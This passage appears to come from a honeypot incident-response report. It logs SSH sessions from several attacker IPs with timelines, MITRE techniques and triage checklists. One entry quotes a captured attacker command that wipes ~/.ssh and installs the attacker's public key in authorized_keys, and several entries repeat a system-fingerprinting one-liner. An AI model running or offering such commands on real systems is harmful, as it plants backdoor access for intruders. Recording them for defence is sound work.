- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4253aee91994

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:50 |
| **Last Seen** | 2026-08-24 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:50:51` | `cowrie.session.connect` |
| `2026-08-24 04:50:51` | `cowrie.client.version` |
| `2026-08-24 04:50:51` | `cowrie.client.kex` |
| `2026-08-24 04:50:52` | `cowrie.login.success` |
| `2026-08-24 04:50:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:50:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:50:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54257a5f961

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 04:51 |
| **Last Seen** | 2026-08-24 04:52 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:51:06` | `cowrie.session.connect` |
| `2026-08-24 04:51:09` | `cowrie.client.version` |
| `2026-08-24 04:51:09` | `cowrie.client.kex` |
| `2026-08-24 04:51:57` | `cowrie.login.success` |
| `2026-08-24 04:52:10` | `cowrie.session.params` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.success` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:10` | `cowrie.command.input` |
| `2026-08-24 04:52:12` | `cowrie.log.closed` |
| `2026-08-24 04:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8281fd9f6f21

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-24 04:54 |
| **Last Seen** | 2026-08-24 04:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:54:47` | `cowrie.session.connect` |
| `2026-08-24 04:54:48` | `cowrie.client.version` |
| `2026-08-24 04:54:48` | `cowrie.client.kex` |
| `2026-08-24 04:54:49` | `cowrie.login.success` |
| `2026-08-24 04:54:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373ee74d1cbf

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-08-24 04:55 |
| **Last Seen** | 2026-08-24 04:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:55:01` | `cowrie.session.connect` |
| `2026-08-24 04:55:01` | `cowrie.client.version` |
| `2026-08-24 04:55:01` | `cowrie.client.kex` |
| `2026-08-24 04:55:04` | `cowrie.login.success` |
| `2026-08-24 04:55:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dba2736db61

| Field | Detail |
|---|---|
| **Source IP** | `112.28.153[.]238` |
| **First Seen** | 2026-08-24 04:55 |
| **Last Seen** | 2026-08-24 04:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:55:11` | `cowrie.session.connect` |
| `2026-08-24 04:55:11` | `cowrie.client.version` |
| `2026-08-24 04:55:11` | `cowrie.client.kex` |
| `2026-08-24 04:55:14` | `cowrie.login.success` |
| `2026-08-24 04:55:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.153[.]238` to AbuseIPDB if not already reported
- [ ] Block `112.28.153[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e047237d9932

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 04:55 |
| **Last Seen** | 2026-08-24 04:55 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:55:16` | `cowrie.session.connect` |
| `2026-08-24 04:55:17` | `cowrie.client.version` |
| `2026-08-24 04:55:31` | `cowrie.client.kex` |
| `2026-08-24 04:55:36` | `cowrie.login.success` |
| `2026-08-24 04:55:38` | `cowrie.session.params` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.success` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:38` | `cowrie.command.input` |
| `2026-08-24 04:55:40` | `cowrie.log.closed` |
| `2026-08-24 04:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770c4e64953d

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-08-24 04:59 |
| **Last Seen** | 2026-08-24 04:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:59:32` | `cowrie.session.connect` |
| `2026-08-24 04:59:33` | `cowrie.client.version` |
| `2026-08-24 04:59:33` | `cowrie.client.kex` |
| `2026-08-24 04:59:35` | `cowrie.login.success` |
| `2026-08-24 04:59:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e4f207648a

| Field | Detail |
|---|---|
| **Source IP** | `111.53.131[.]79` |
| **First Seen** | 2026-08-24 04:59 |
| **Last Seen** | 2026-08-24 04:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:59:41` | `cowrie.session.connect` |
| `2026-08-24 04:59:41` | `cowrie.client.version` |
| `2026-08-24 04:59:41` | `cowrie.client.kex` |
| `2026-08-24 04:59:44` | `cowrie.login.success` |
| `2026-08-24 04:59:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.131[.]79` to AbuseIPDB if not already reported
- [ ] Block `111.53.131[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c519493ded69

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:00 |
| **Last Seen** | 2026-08-24 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:00:20` | `cowrie.session.connect` |
| `2026-08-24 05:00:20` | `cowrie.client.version` |
| `2026-08-24 05:00:20` | `cowrie.client.kex` |
| `2026-08-24 05:00:21` | `cowrie.login.success` |
| `2026-08-24 05:00:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:00:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:00:22` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e154dbff56

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:00 |
| **Last Seen** | 2026-08-24 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:00:24` | `cowrie.session.connect` |
| `2026-08-24 05:00:24` | `cowrie.client.version` |
| `2026-08-24 05:00:24` | `cowrie.client.kex` |
| `2026-08-24 05:00:25` | `cowrie.login.success` |
| `2026-08-24 05:00:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:00:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:00:25` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e702a4b58dd6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:01 |
| **Last Seen** | 2026-08-24 05:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:01:52` | `cowrie.session.connect` |
| `2026-08-24 05:01:53` | `cowrie.client.version` |
| `2026-08-24 05:01:53` | `cowrie.client.kex` |
| `2026-08-24 05:01:58` | `cowrie.login.success` |
| `2026-08-24 05:02:00` | `cowrie.session.params` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.success` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:00` | `cowrie.command.input` |
| `2026-08-24 05:02:02` | `cowrie.log.closed` |
| `2026-08-24 05:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7100c449483b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:05 |
| **Last Seen** | 2026-08-24 05:05 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:05:25` | `cowrie.session.connect` |
| `2026-08-24 05:05:26` | `cowrie.client.version` |
| `2026-08-24 05:05:26` | `cowrie.client.kex` |
| `2026-08-24 05:05:32` | `cowrie.login.success` |
| `2026-08-24 05:05:35` | `cowrie.session.params` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.success` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:35` | `cowrie.command.input` |
| `2026-08-24 05:05:37` | `cowrie.log.closed` |
| `2026-08-24 05:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c938994c9c02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:09 |
| **Last Seen** | 2026-08-24 05:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:09:33` | `cowrie.session.connect` |
| `2026-08-24 05:09:34` | `cowrie.client.version` |
| `2026-08-24 05:09:34` | `cowrie.client.kex` |
| `2026-08-24 05:09:39` | `cowrie.login.success` |
| `2026-08-24 05:09:42` | `cowrie.session.params` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.success` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:42` | `cowrie.command.input` |
| `2026-08-24 05:09:43` | `cowrie.log.closed` |
| `2026-08-24 05:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c9160b5a7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:09 |
| **Last Seen** | 2026-08-24 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:09:46` | `cowrie.session.connect` |
| `2026-08-24 05:09:46` | `cowrie.client.version` |
| `2026-08-24 05:09:46` | `cowrie.client.kex` |
| `2026-08-24 05:09:47` | `cowrie.login.success` |
| `2026-08-24 05:09:47` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:09:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:09:47` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa30023e33bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:09 |
| **Last Seen** | 2026-08-24 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:09:50` | `cowrie.session.connect` |
| `2026-08-24 05:09:50` | `cowrie.client.version` |
| `2026-08-24 05:09:50` | `cowrie.client.kex` |
| `2026-08-24 05:09:51` | `cowrie.login.success` |
| `2026-08-24 05:09:51` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:09:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:09:51` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2585cd041743

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-08-24 05:10 |
| **Last Seen** | 2026-08-24 05:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:10:16` | `cowrie.session.connect` |
| `2026-08-24 05:10:16` | `cowrie.client.version` |
| `2026-08-24 05:10:16` | `cowrie.client.kex` |
| `2026-08-24 05:10:17` | `cowrie.login.success` |
| `2026-08-24 05:10:18` | `cowrie.session.params` |
| `2026-08-24 05:10:18` | `cowrie.command.input` |
| `2026-08-24 05:10:18` | `cowrie.command.failed` |
| `2026-08-24 05:10:18` | `cowrie.log.closed` |
| `2026-08-24 05:10:19` | `cowrie.session.params` |
| `2026-08-24 05:10:19` | `cowrie.command.input` |
| `2026-08-24 05:10:19` | `cowrie.session.file_download` |
| `2026-08-24 05:10:19` | `cowrie.log.closed` |
| `2026-08-24 05:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ddc42f70dd6

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-08-24 05:10 |
| **Last Seen** | 2026-08-24 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:10:19` | `cowrie.session.connect` |
| `2026-08-24 05:10:19` | `cowrie.client.version` |
| `2026-08-24 05:10:20` | `cowrie.client.kex` |
| `2026-08-24 05:10:20` | `cowrie.login.success` |
| `2026-08-24 05:10:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7876f98484ee

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-08-24 05:10 |
| **Last Seen** | 2026-08-24 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:10:21` | `cowrie.session.connect` |
| `2026-08-24 05:10:21` | `cowrie.client.version` |
| `2026-08-24 05:10:21` | `cowrie.client.kex` |
| `2026-08-24 05:10:22` | `cowrie.login.success` |
| `2026-08-24 05:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b80574e5136

| Field | Detail |
|---|---|
| **Source IP** | `62.221.107[.]99` |
| **First Seen** | 2026-08-24 05:14 |
| **Last Seen** | 2026-08-24 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:14:55` | `cowrie.session.connect` |
| `2026-08-24 05:14:55` | `cowrie.client.version` |
| `2026-08-24 05:14:55` | `cowrie.client.kex` |
